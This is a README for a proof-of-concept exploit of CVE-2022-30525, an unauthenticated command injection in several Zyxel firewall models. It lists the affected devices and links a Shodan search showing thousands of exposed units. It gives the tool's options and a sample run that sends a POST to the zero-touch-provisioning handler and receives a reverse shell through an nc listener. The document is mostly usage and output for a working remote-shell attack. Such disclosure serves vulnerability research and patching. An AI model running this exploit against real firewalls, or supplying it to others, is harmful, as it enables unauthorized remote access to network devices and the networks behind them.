# Victorian Machinery

Victorian Machinery is a proof of concept exploit for CVE-2022-30525. The vulnerability is an unauthenticated and remote command injection vulnerability affecting Zyxel firewall's that support zero touch provisioning. Zyxel pushed a fix for this issue on April 28, 2022. The following models are known to be affected:

* USG FLEX 100, 100W, 200, 500, 700
* ATP 100, 200, 500, 700, 800
* USG20-VPN and USG20w-VPN

At the time of writing, there were more than [16,000](https://www.shodan.io/search?query=title%3A%22USG+FLEX+100%22%2C%22USG+FLEX+100w%22%2C%22USG+FLEX+200%22%2C%22USG+FLEX+500%22%2C%22USG+FLEX+700%22%2C%22USG+FLEX+50%22%2C%22USG+FLEX+50w%22%2C%22ATP100%22%2C%22ATP200%22%2C%22ATP500%22%2C%22ATP700%22) affected devices visible on Shodan. Exposing the management web interface *is not* the default setting, which implies there are many more affected systems not exposed to the internet. These systems also support automatic update (not enabled by default) so a good subset are already patched against this issue.

## PoC Video

https://youtu.be/x8Vzq9tm47c

## Options

Victorian Machinery expliots the target and catches a reverse shell using a forked `nc` listener. This was tested on Ubuntu 20.04. The PoC tries to execute `/usr/bin/nc` by default. If your `nc` is somewhere else than you'll need to update the `nc-path` option. See the complete help menu below:

```sh
albinolobster@ubuntu:~/victorian_machinery$ python3 victorian_machinery.py --help

$$\    $$\ $$\             $$\                         $$\                             
$$ |   $$ |\__|            $$ |                        \__|                            
$$ |   $$ |$$\  $$$$$$$\ $$$$$$\    $$$$$$\   $$$$$$\  $$\  $$$$$$\  $$$$$$$\          
\$$\  $$  |$$ |$$  _____|\_$$  _|  $$  __$$\ $$  __$$\ $$ | \____$$\ $$  __$$\         
 \$$\$$  / $$ |$$ /        $$ |    $$ /  $$ |$$ |  \__|$$ | $$$$$$$ |$$ |  $$ |        
  \$$$  /  $$ |$$ |        $$ |$$\ $$ |  $$ |$$ |      $$ |$$  __$$ |$$ |  $$ |        
   \$  /   $$ |\$$$$$$$\   \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$$ |$$ |  $$ |        
$$\ \_/  $$\__| \_______|   \____$$\______$$\__|      \__| \_______|\__|  \__|        
$$$\    $$$ |                    $$ |      \__|                                        
$$$$\  $$$$ | $$$$$$\   $$$$$$$\ $$$$$$$\  $$\ $$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ 
$$\$$\$$ $$ | \____$$\ $$  _____|$$  __$$\ $$ |$$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |
$$ \$$$  $$ | $$$$$$$ |$$ /      $$ |  $$ |$$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|$$ |  $$ |
$$ |\$  /$$ |$$  __$$ |$$ |      $$ |  $$ |$$ |$$ |  $$ |$$   ____|$$ |      $$ |  $$ |
$$ | \_/ $$ |\$$$$$$$ |\$$$$$$$\ $$ |  $$ |$$ |$$ |  $$ |\$$$$$$$\ $$ |      \$$$$$$$ |
\__|     \__| \_______| \_______|\__|  \__|\__|\__|  \__| \_______|\__|       \____$$ |
                                                                             $$\   $$ |
                                  ⚙ jbaines-r7                              \$$$$$$  |
                                 CVE-2022-30525                              \______/ 
                                       🦞                                             

usage: victorian_machinery.py [-h] --rhost RHOST [--rport RPORT] --lhost LHOST [--lport LPORT] [--protocol PROTOCOL] [--nc-path NCPATH]

Zyxel Firewall Command Injection (CVE-2022-30525)

optional arguments:
  -h, --help           show this help message and exit
  --rhost RHOST        The remote address to exploit
  --rport RPORT        The remote port to exploit
  --lhost LHOST        The local address to connect back to
  --lport LPORT        The local port to connect back to
  --protocol PROTOCOL  The protocol handler to use
  --nc-path NCPATH     The path to nc

```

## Example Usage

```sh
albinolobster@ubuntu:~/victorian_machinery$ python3 victorian_machinery.py --rhost 10.0.0.14 --lhost 10.0.0.28

$$\    $$\ $$\             $$\                         $$\                             
$$ |   $$ |\__|            $$ |                        \__|                            
$$ |   $$ |$$\  $$$$$$$\ $$$$$$\    $$$$$$\   $$$$$$\  $$\  $$$$$$\  $$$$$$$\          
\$$\  $$  |$$ |$$  _____|\_$$  _|  $$  __$$\ $$  __$$\ $$ | \____$$\ $$  __$$\         
 \$$\$$  / $$ |$$ /        $$ |    $$ /  $$ |$$ |  \__|$$ | $$$$$$$ |$$ |  $$ |        
  \$$$  /  $$ |$$ |        $$ |$$\ $$ |  $$ |$$ |      $$ |$$  __$$ |$$ |  $$ |        
   \$  /   $$ |\$$$$$$$\   \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$$ |$$ |  $$ |        
$$\ \_/  $$\__| \_______|   \____$$\______$$\__|      \__| \_______|\__|  \__|        
$$$\    $$$ |                    $$ |      \__|                                        
$$$$\  $$$$ | $$$$$$\   $$$$$$$\ $$$$$$$\  $$\ $$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ 
$$\$$\$$ $$ | \____$$\ $$  _____|$$  __$$\ $$ |$$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |
$$ \$$$  $$ | $$$$$$$ |$$ /      $$ |  $$ |$$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|$$ |  $$ |
$$ |\$  /$$ |$$  __$$ |$$ |      $$ |  $$ |$$ |$$ |  $$ |$$   ____|$$ |      $$ |  $$ |
$$ | \_/ $$ |\$$$$$$$ |\$$$$$$$\ $$ |  $$ |$$ |$$ |  $$ |\$$$$$$$\ $$ |      \$$$$$$$ |
\__|     \__| \_______| \_______|\__|  \__|\__|\__|  \__| \_______|\__|       \____$$ |
                                                                             $$\   $$ |
                                  ⚙ jbaines-r7                              \$$$$$$  |
                                 CVE-2022-30525                              \______/ 
                                       🦞                                             

[+] Executing netcat listener
[+] Using /usr/bin/nc
Listening on 0.0.0.0 1270
[+] Sending a POST request to https://10.0.0.14:443/ztp/cgi-bin/handler
Connection received on 10.0.0.14 43957
bash: cannot set terminal process group (10800): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ id
id
uid=99(nobody) gid=10003(shadowr) groups=99,10003(shadowr)
```

## Credit

* [Red Hot Chili Peppers](https://www.youtube.com/watch?v=o-4Fo-gJnXU)
